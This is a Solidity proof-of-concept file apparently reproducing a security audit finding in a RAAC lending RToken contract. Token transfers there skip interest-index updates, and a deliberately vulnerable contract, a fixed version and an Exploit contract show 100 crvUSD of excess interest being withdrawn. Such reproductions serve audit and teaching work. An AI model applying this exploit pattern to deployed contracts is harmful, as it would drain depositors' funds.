// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  RAAC RToken — Pashov C-01 (2025-05-06).
    balanceOf pays rawBalance * (liquidityIndex - user.index) / RAY.
    transfer moves raw units and never writes the index. Raw tokens moved
    from a fresh (high-index) account onto an older (low-index) account
    are treated as if they accrued the recipient's whole interest gap.
    100 crvUSD of raw principal becomes 100 extra crvUSD of claimable interest.
*/

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
}

interface ILendingPool {
    function getNormalizedIncome() external view returns (uint256);
    function updateUserReward(address account) external;
}

library RayMath {
    uint256 internal constant RAY = 1e27;

    function rayMul(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * b) / RAY;
    }
}

using RayMath for uint256;

contract Usd {
    string public symbol = "crvUSD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LendingPool is ILendingPool {
    uint256 public liquidityIndex = 1e27;

    function setIndex(uint256 index) external {
        liquidityIndex = index;
    }

    function getNormalizedIncome() external view returns (uint256) {
        return liquidityIndex;
    }

    function updateUserReward(address) external {}
}

contract ERC20 is IERC20 {
    mapping(address => uint256) internal _balances;

    function balanceOf(address account) public view virtual returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual returns (bool) {
        _update(msg.sender, recipient, amount);
        return true;
    }

    function _update(address from, address to, uint256 amount) internal virtual {
        if (from != address(0)) _balances[from] -= amount;
        if (to != address(0)) _balances[to] += amount;
    }

    function _mint(address to, uint256 amount) internal {
        _update(address(0), to, amount);
    }
}

contract RToken is ERC20 {
    struct UserState {
        uint256 index;
    }

    address internal _lendingPool;
    Usd public usd;
    mapping(address => UserState) internal _userState;

    constructor(address pool, Usd _usd) {
        _lendingPool = pool;
        usd = _usd;
    }

    function rawBalanceOf(address account) public view returns (uint256) {
        return super.balanceOf(account);
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 rawBalance = super.balanceOf(account);
        uint256 liquidityIndex = ILendingPool(_lendingPool).getNormalizedIncome();
        uint256 userIndex = liquidityIndex - _userState[account].index;

        if (userIndex == 0) return rawBalance;
        // principle + interest
        return rawBalance + rawBalance.rayMul(userIndex);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        return super.transfer(recipient, amount);
    }

    function _update(address from, address to, uint256 amount) internal virtual override {
        if (from != address(0)) {
            // Update rewards for sender before transfer
            ILendingPool(_lendingPool).updateUserReward(from);
        }
        if (to != address(0) && to != from) {
            // Update rewards for recipient before transfer
            ILendingPool(_lendingPool).updateUserReward(to);
        }
        // actual share amount is
        // @> VULN: raw RToken moves without accruing interest or writing either account's index
        super._update(from, to, amount);
    }

    function deposit(address account, uint256 raw) external {
        _userState[account].index = ILendingPool(_lendingPool).getNormalizedIncome();
        require(usd.transferFrom(msg.sender, address(this), raw), "pull");
        _mint(account, raw);
    }

    function withdraw(address account) external returns (uint256 paid) {
        paid = balanceOf(account);
        uint256 raw = super.balanceOf(account);
        require(usd.transfer(account, paid), "pay");
        if (raw > 0) super._update(account, address(0), raw);
    }
}

contract RTokenFixed is RToken {
    constructor(address pool, Usd _usd) RToken(pool, _usd) {}

    function _update(address from, address to, uint256 amount) internal override {
        if (from != address(0)) _accrue(from);
        if (to != address(0) && to != from) _accrue(to);
        super._update(from, to, amount);
    }

    function _accrue(address account) internal {
        uint256 raw = rawBalanceOf(account);
        uint256 idx = ILendingPool(_lendingPool).getNormalizedIncome();
        if (raw == 0) {
            _userState[account].index = idx;
            return;
        }
        uint256 prev = _userState[account].index;
        if (idx > prev) {
            uint256 interest = raw.rayMul(idx - prev);
            super._update(address(0), account, interest);
        }
        _userState[account].index = idx;
    }
}

contract FreshAccount {
    function dump(RToken token, address to) external {
        token.transfer(to, token.rawBalanceOf(address(this)));
    }
}

contract Exploit {
    Usd public usd;
    LendingPool public pool;
    RToken public rtoken;
    FreshAccount public fresh;
    uint256 public fair;
    uint256 public inflated;
    uint256 public paid;

    constructor() {
        usd = new Usd();
        pool = new LendingPool();
        rtoken = new RToken(address(pool), usd);
        fresh = new FreshAccount();
        pool.setIndex(1e27);
        usd.mint(address(this), 200 ether);
        usd.approve(address(rtoken), type(uint256).max);
        rtoken.deposit(address(this), 100 ether);
        pool.setIndex(2e27);
        rtoken.deposit(address(fresh), 100 ether);
        usd.mint(address(rtoken), 200 ether);
    }

    function run() external {
        fair = rtoken.balanceOf(address(this)) + rtoken.balanceOf(address(fresh));
        fresh.dump(rtoken, address(this));
        inflated = rtoken.balanceOf(address(this));
        paid = rtoken.withdraw(address(this));
        require(fair == 300 ether, "fair");
        require(inflated == 400 ether, "inflated");
        require(paid == 400 ether, "paid");
        require(paid - fair == 100 ether, "excess");
        require(usd.balanceOf(address(this)) == 400 ether, "balance");
        require(rtoken.rawBalanceOf(address(fresh)) == 0, "fresh raw");
    }
}
